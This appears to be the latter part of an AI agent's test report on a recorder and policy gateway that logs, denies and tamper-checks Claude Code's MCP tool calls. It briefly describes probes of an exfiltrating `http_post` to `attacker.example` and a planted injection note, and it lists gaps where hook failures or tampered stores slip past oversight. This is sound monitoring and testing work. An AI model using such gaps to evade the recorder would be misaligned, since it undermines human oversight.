receiver 1 stdout: [mcp-receiver] ALERT chain_fork chain=8549d425e245efd6 key=5fb138cfcb6f523d seq 12 is already stored with hash 3cbc9fec…, but this batch offers 633b2267… — history was rewritten
```

The fork is caught and alerted. But the store that PASSES `verify` is the one told "history was rewritten", while the receiver keeps the extension from the store that FAILS `verify` (surprise 8).

Afterwards I stopped every df6 receiver and shipper:

```
$ ps -eo pid,ppid,etimes,args | grep -E "df6-(rx|sink)" | grep -v grep || echo "no df6 processes left"; ss -ltnp 2>/dev/null | grep -E ":878[78]\b" || echo "ports 8787/8788 free"
no df6 processes left
ports 8787/8788 free
```

---

## Expected vs. recorded

| # | Expectation | Recorded |
| --- | --- | --- |
| a | A local session's MCP config key equals the tool-name segment | **No config key exists** for any claude.ai hosted connector, on either local surface. The two surfaces name the same connector differently (UUID in Desktop, `claude_ai_ClickUp` in the CLI). Without `MCP_RECORDER_MCP_CONFIG` the hook looks only for `/tmp/mcp-config-*.json`, and none exists locally, so it reads no config. |
| b | A tool-anchored hook deny blocks a live hosted-connector call in a new local session | **Met**, twice (WSL CLI). |
| c | The same deny works for a Windows-hosted session | **Partly measured.** A synthetic pipe denies correctly. Through Git Bash without `MSYS_NO_PATHCONV=1`, `wsl.exe` exits 1 before the recorder starts: no deny and nothing recorded. Per Claude Code's hook docs that is non-blocking, so the call would go ahead (not observed live). No live Windows-host session was run: the standalone `claude.exe` is not signed in, and I did not sign it in. |
| d | `server.url` recorded for hosted connectors | **Not met**, and not reachable locally. |
| e | Gateway denies `http_post` with a readable refusal | **Met**, twice, with the exact text quoted. |
| f | An allowed call is forwarded byte-for-byte | **Met**, both directions, measured on the wire. The single change was the policy's secret redaction. |
| g | Receiver started with `ingest auth  1 token(s)` and actually listening | **Met**; the listener pid matched. |
| h | Receiver holds the recorded chain, nothing withheld | **Met**: 11/11 held and attested, `chain_id_verified`, claimed head == head. |
| i | Tampering is detected | **Met by `verify`** (FAIL, seq 7) and by a receiver that never had the original (400, stall). **Not surfaced** when the receiver already held seq 7. A `verify`-failing store could extend the remote chain, and the later fork alert was raised against the honest store. |

---

## WSL-specific problems, with the exact errors

1. **Git Bash path conversion breaks any `wsl.exe` hook command built from Linux paths.** Exact error: `<3>WSL (271949 - Relay) ERROR: CreateProcessCommon:798: execvpe(C:/Program Files/Git/home/<user>/.nvm/versions/node/v24.21.0/bin/node) failed: No such file or directory` (exit 1). MSYS rewrites `/home/...` as `C:/Program Files/Git/home/...`. `MSYS_NO_PATHCONV=1` fixes it, and PowerShell is unaffected. The recorder never starts, so nothing is recorded.
2. **`hook install` only writes Linux-side commands.** Its command (`"/home/<user>/.nvm/…/node" "/home/<user>/…/dist/cli.js" hook …`) cannot run in a Claude Code hosted on the Windows side, which is where the Desktop Code tab runs. `setup` has `--wrapper wsl`; `hook install` has no equivalent, only a verbatim `--command`.
3. **The Windows host has no `node` or `npx` on PATH** (`node -> NOT FOUND`, `npx -> NOT FOUND`; `sh` resolves to Git's `sh.exe`). The project `.mcp.json` servers need both (`sh scripts/dogfood-wrap.sh … npx …`), and in the Desktop Code tab they report `Connection closed`. That is the likely cause, but I did not isolate it.
4. **Git worktrees created by Desktop cannot be used from WSL git.** Exact error: `fatal: not a git repository: //wsl.localhost/ubuntu-20.04/home/<user>/dev/cresec/audit/.git/worktrees/mcp-recorder-claude-desktop-0d281d`. The prompt's Part 0 cannot run inside the session's own worktree.
5. **Windows git shows phantom changes in that worktree.** It reports `M` on three shell scripts, with `mode change 100755 => 100644` and 0 content lines changed, because `core.filemode=true` over `\\wsl.localhost`.
6. **MSIX file virtualization.** Windows processes spawned by Desktop see the Desktop session metadata at `%APPDATA%\Claude\claude-code-sessions\…`. On the raw disk, which is what WSL sees, the file exists only under `AppData/Local/Packages/Claude_pzs8sxrjxfjjc/LocalCache/Roaming/Claude/…`. Exact error: `ls: cannot access '/mnt/c/Users/<user>/AppData/Roaming/Claude/claude-code-sessions/…/local_2b83d6dd-….json': No such file or directory`.
7. **Two PID namespaces.** `wsl.exe -e bash` lands in `pid:[4026533171]`, where pid 1 is `systemd`. `wsl.exe -e /bin/sh` lands in `pid:[4026532394]`, where pid 1 is `init`. A port or process check from one view can therefore miss processes started through the other. Part 4's port checks were done from both views; process listings only from bash. The receiver's `ss` pid matched the process I started, so no stale listener was involved.
8. **Not shown to be WSL-specific, but seen on this WSL machine:** the flaky wall-clock test from Part 0.

---

## What worked and what did not, per part

| Part | Worked | Did not / not measured |
| --- | --- | --- |
| 0 | Clean `main` at `6dc4399`. Typecheck and ESLint clean. The second full run gave 1317 passed and 3 skipped. | The first full run had 1 flaky timing failure (`policy.test.ts:1955`): 1 of 2 full-suite runs failed. |
| 1 | The naming datum was measured on two local surfaces, from connector status, init messages and config file shapes. `/tmp/mcp-config*` is absent even during a live CLI session. Both surfaces are on the same account (matching hashes). | No config key exists for any claude.ai connector. Without `MCP_RECORDER_MCP_CONFIG` the hook looks only for `/tmp/mcp-config-*.json`, and none exists locally. Pointing the variable at the Desktop session file or at the Desktop chat config resolves nothing. Unexplained: the `corp-notes` tools in the Desktop tool list despite a failed server; 59 vs 61 in `enabledMcpTools`. |
| 2 | WSL CLI, new session: the tool-anchored deny **blocked both calls**; `sessions`, `verify` (PASS) and `query` behaved. Windows host, synthetic: correct deny JSON through `wsl.exe` from PowerShell, and from Git Bash with `MSYS_NO_PATHCONV=1`. | No `server.url`. `query` on the full Claude Code tool name finds nothing. The repo hook's store records the denied calls as unfinished, non-error calls. `--undo` is not byte-exact and leaves untracked backups. No live Windows-host session (the standalone `claude.exe` is not signed in). The hot-reload probe was inconclusive. |
| 3 | `http_post` denied with a readable refusal, twice. Allowed calls byte-identical both ways. The canary was redacted before reaching the client. The injection note passed unchanged **and** was flagged (`injection_found: 1`). `verify` PASS. No plaintext of the probe strings in the store. | `query` matches exact values only: `attacker.example` finds 0 while the full URL finds 2. |
| 4 | The receiver authenticated (`1 token(s)`), the shipper auto-started, and 11 of 11 records were held and attested with claimed head == head. The tampered store FAILs `verify` loudly. A fresh receiver rejects the tampered batch. A later fork is detected and alerted. | Copying a data dir also copies its "live" shipper lock and status. A `verify`-failing store could extend the remote chain, and the fork was blamed on the honest store. A tamper-caused 400 raised no alert. `ship --drain` exits 0 even when stalled on tamper. `ship --status` showed `attested_seq` above `next_seq`. The receiver prints its operator token at startup. Every shipped event carries an unsalted hash of the ingest token. |
| 5 | This report. | Export bundles are not committed (public repo, plaintext hostname and user). |

---

## Surprises / things that look wrong

1. **(Headline) Locally, the hook can never learn where a hosted connector points.**
   - There is no `/tmp/mcp-config-*.json`, before, during or after a CLI session.
   - No claude.ai connector has an `mcpServers` entry in any local config I inspected.
   - Without `MCP_RECORDER_MCP_CONFIG`, the hook reads nothing else (`mcp-config.ts:51-56`).
   - So `server.url` is never recorded, the host-alias policy form can never fire, and PR #16's route 2 is unreachable in every local session on this machine.

   The comment at `src/hook/mcp-config.ts:37-38` says local sessions are "keyed by friendly name with friendly tool names (route 1 again)". That is not what happens here. Users writing local policies need to be told that only tool-anchored rules work.
2. **One machine, one account, one connector, several local tool names.**
   - ClickUp is `mcp__47d587b8-…__clickup_*` in the Desktop Code tab and `mcp__claude_ai_ClickUp__clickup_*` in the WSL CLI. Cloud dogfood 4 saw a third form, `mcp__ClickUp__…`.
   - Inside a single Desktop session, tools named for `visualize` exist under both `mcp__visualize__*` and `mcp__6f616b42-…__*`. Whether these are one connector or two was not verified.

   Any rule anchored on the server segment, whether a recorder policy or a Claude Code permission, is therefore surface-specific. The UUID-form allow rule already in `.claude/settings.local.json` should be dead in the CLI (not tested).
3. **Two recorders on one call disagree about what happened.** On `main`, the tracked `.claude/settings.json` always runs the repo's policy-less hook. A policy hook added in the same checkout therefore creates this double setup.
   - The policy hook records `is_error: true, error.type: policy_denied`.
   - The other hook records `is_error: false, phase: pre` for the same `tool_use_id`, never completes it, and leaves `hook-pending/` markers that are only swept after 24 h.
   - Nothing in the second store says the call was denied or never ran.
4. **`hook install --undo` is not byte-exact, and install/undo litter the repo.**
   - Undo leaves `"hooks": {}` where the file previously had no `hooks` key. `docs/hooks.md:62-63` says `--undo` "removes exactly the entries this command added".
   - Each install, and each undo that changes the file, writes a `settings*.json.bak-<timestamp>` next to the settings file. The no-op undo wrote none.
   - Those backups are not gitignored (`??` in `git status`), so in a public repo they are one `git add .` away from being committed.
5. **`hook install`'s default target is the tracked `.claude/settings.json`**, so a bare `hook install` in this repo modifies a tracked file. `hook install --help` prints the entire global help instead of subcommand help.
6. **Metrics and lookups that read wrong:**
   - `sessions` shows `DECISIONS 0` for two real hook denies, which repeats cloud dogfood 5's surprise 2.
   - `sessions` truncates ids to 8 characters, so two distinct synthetic sessions both printed as `df6-synt`.
   - `query mcp__claude_ai_ClickUp__clickup_filter_tasks`, the name an operator actually sees in Claude Code, returns 0 matches. Only the bare `clickup_filter_tasks` works.
   - `query attacker.example` returns 0 while the full URL matches. Refs match exact values only, which should be said wherever `query` is described as a blast-radius tool.
   - A hook `session_end` event reports `events_recorded: 0`, `reason: "child_exit"` and `child_exit_code: null` for a session that recorded 4 other events and has no child process.
7. **In the evidence, a broken Windows-side hook looks like "no MCP calls happened".** MSYS path mangling (exit 1, before the recorder starts) and malformed stdin (exit 0, nothing on stderr) both leave no deny, no event and no recorder-side trace. Claude Code's own stream-json does report hook exit codes (`hook_response … "exit_code"`), but the evidence store shows nothing.
8. **The sink trusts whoever ships first, and the shipper never checks its own store.**
   - After the copy's local seq 7 had been rewritten, its shipper still extended receiver 1's chain with seq 12–22. The receiver accepted them without a rejection or an alert.
   - When the original, which PASSES `verify`, then shipped its own seq 12, it received the `chain_fork` 409, and the ALERT "history was rewritten" was raised against it.
   - Fork detection works, but the canonical branch and the blame both depend only on arrival order.
   - Checking the local chain before sending, as `verify` already does, would have stalled the tampered copy instead.
9. **Copying a data dir copies its liveness.** `cp -a` brings along `ship.lock/owner`, which holds the original's pid with a fresh mtime, and `ship-status.json`. On the copy:
   - `ship --status` reports `idle (shipper running)` with the **original's** `last success`.
   - `ship --drain` refuses with `another shipper is already running for this data dir` and exits 0, for up to 5 minutes.

   Liveness is judged by mtime alone; nothing checks whether the pid in `owner` is alive.
10. **A tamper-caused rejection is quieter than a fork.**
    - Receiver 2 answered 400 with a detail saying "the event was altered". That produced two `/v1/rejections` entries and `"alerts": []`.
    - It rejected the whole batch 1–22, so it holds 0 records of a chain whose first 6 records were valid (`records_held=0`, `chain_id_verified=false`).
    - `ship --drain` exited 0 while stalled on the tamper. `|| true` is documented for CI, but exit 0 by itself means a CI step cannot notice even this.
11. **`ship --status` after the fork mixes two sources:** `receiver: next_seq 12, attested_seq 22`, attested beyond `next_seq`.
12. **Secrets and personal data around the sink:**
    - The reference receiver prints its operator bearer token on stdout at startup.
    - With the sink configured, **every** recorded event carries `identity.credential_fingerprints: [{"name": "MCP_RECORDER_SINK_TOKEN", "ref": "sha256:f0ca1567…"}]`. That is all 22 records receiver 1 stored and all 11 records offered in the fork batch (logged follow-up: `credfp.cjs`).
    - The ref is exactly the **unsalted** sha256 of the ingest token string `local-ingest`, shipped to the receiver configured to accept that token. It is trivially reversible for a low-entropy token.
    - Events also carry the real hostname and OS username in plaintext (`identity.hostname`, `identity.os_user`), and those ship too. A fixed-string grep counted 8 and 10 hits in `/tmp/df6-local`, and 33 and 36 in receiver 1's store `/tmp/df6-rx`.
13. **Asking the model is not a measurement.** A single `claude -p` asked to list its `mcp__` tools left out all 61 ClickUp tools. That run did not capture its init message, so the cause cannot be pinned down. It may be connection timing: in the Part 2 session `claude.ai ClickUp` was still `pending` at init and its tools were missing from the init tool list. The model then called ToolSearch to load the tool before calling it. A dogfood step that asks the agent "what tools do you have" can under-report connectors.
14. **A headless `claude -p` in this checkout connects the `.mcp.json` servers** that `claude mcp list` reports as `⏸ Pending approval`. The repo's tracked hooks and the `dogfood-wrap.sh` proxies started recording into `.mcp-recorder/` as soon as Part 1 ran. The store's first events are a hook `session_start` at 09:07:07.576Z and the `repo-filesystem` and `corp-notes` proxy sessions at 09:07:11.831Z and 09:07:11.834Z, during the Part 1 `claude mcp list` / `claude -p` runs (logged follow-up). The directory is gitignored and was left in place.
15. **Long-running processes that predate this run.** Three ~39-hour-old `mcp-recorder record` processes are still running (`etimes` 141 337 and 141 331 s):
    - one with **ppid 1** (orphaned), wrapping `npx -y mcp-remote https://mcp.clickup.com/mcp` into `~/.mcp-recorder`;
    - two `corp-notes` wrappers whose parents are still alive.

    I left them untouched.
16. **Unexplained Desktop tool-list entries:** `mcp__corp-notes__*` tools are listed while the `corp-notes` server reports `failed`, and ClickUp has 59 `enabledMcpTools` entries against 61 tools.

---

## Files in this directory

- `REPORT.md`: this file.

**Deliberately not committed:** the signed export bundles of the Part 2 hook store (5 events) and the Part 3 gateway store (13 events). Both were produced and verified on the machine:

```
$ rm -rf /tmp/df6-export && mkdir -p /tmp/df6-export && node dist/cli.js export --data-dir /tmp/df6-local --out /tmp/df6-export/hook-deny.zip && node dist/cli.js verify --bundle /tmp/df6-export/hook-deny.zip
[mcp-recorder] exported 5 event(s) (seq 1..5), head 4c75ae467968b965… signed by ed25519 8f3608f01f71230d…
…
PASS — chain intact: 5 event(s), head seq 5
…
$ node dist/cli.js export --data-dir /tmp/df6-gw --out /tmp/df6-export/gateway.zip && node dist/cli.js verify --bundle /tmp/df6-export/gateway.zip
[mcp-recorder] exported 13 event(s) (seq 1..13), head b99e7a4e7b48871b… signed by ed25519 1c89495a86430e35…
…
PASS — chain intact: 13 event(s), head seq 13
…
$ cd /tmp/df6-export && mkdir -p u1 u2 && cd u1 && unzip -q ../hook-deny.zip && ls && node verify.cjs | head -3 && cd ../u2 && unzip -q ../gateway.zip && ls && node verify.cjs | head -3
…
PASS: evidence bundle verified
  events     : 5 (seq 1..5)
…
PASS: evidence bundle verified
  events     : 13 (seq 1..13)
…
```

They stay in `/tmp/df6-export/`. Every event in them holds this machine's real hostname and OS username in plaintext, and this repository is public. Cloud dogfood 5's `incident.zip` came from a cloud container session; these bundles would publish a personal machine's identifiers.
